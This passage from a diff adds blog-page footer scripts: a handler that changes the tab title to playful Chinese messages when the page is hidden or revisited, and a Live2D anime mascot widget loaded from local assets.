+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '你去哪啦！(｡•ˇ‸ˇ•｡)';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来！( • ̀ω•́ )✧';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"superSample":2,"width":170,"height":340,"position":"right","hOffset":-20,"vOffset":-60},"mobile":{"show":true,"scale":0.8},"react":{"opacity":0.9},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
